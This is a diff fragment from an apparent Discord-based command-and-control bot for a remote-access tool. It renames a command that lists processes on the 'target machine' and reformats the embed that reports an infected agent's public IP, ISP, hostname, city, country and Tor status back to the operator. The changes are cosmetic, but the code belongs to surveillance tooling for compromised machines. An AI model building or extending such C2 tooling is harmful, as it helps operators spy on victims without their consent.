@@ -171,7 +171,7 @@ async def cd(ctx: commands.Context, path:str):
         await ctx.reply(embed=my_embed)
     
 
-@bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
+@bot.hybrid_command(name = "processes", with_app_command = True, description = "List all the processes running on the target machine")
 @app_commands.guilds(GUILD)
 async def process(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -288,13 +288,13 @@ async def location(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
         response = ghostagent.location()
         if response != False:
-            my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
-            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
-            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
-            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
-            my_embed.add_field(name="City:", value=f"**{response.json()['YourFuckingCity']}**", inline=False)
-            my_embed.add_field(name="Country:", value=f"**{response.json()['YourFuckingCountry']}**", inline=False)
-            my_embed.add_field(name="TorVPN:", value=f"**{response.json()['YourFuckingTorExit']}**", inline=False)
+            my_embed = discord.Embed(title=f"Public IP Location Agent#{ID}", color=0x00FF00)
+            my_embed.add_field(name="IP: ", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=True)
+            my_embed.add_field(name="ISP: ", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
+            my_embed.add_field(name="Hostname: ", value=f"**{response.json()['YourFuckingHostname']}**", inline=True)
+            my_embed.add_field(name="City: ", value=f"**{response.json()['YourFuckingCity']}**", inline=True)
+            my_embed.add_field(name="Country: ", value=f"**{response.json()['YourFuckingCountry']}**", inline=True)
+            my_embed.add_field(name="TorVPN: ", value=f"**{response.json()['YourFuckingTorExit']}**", inline=True)
         else:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
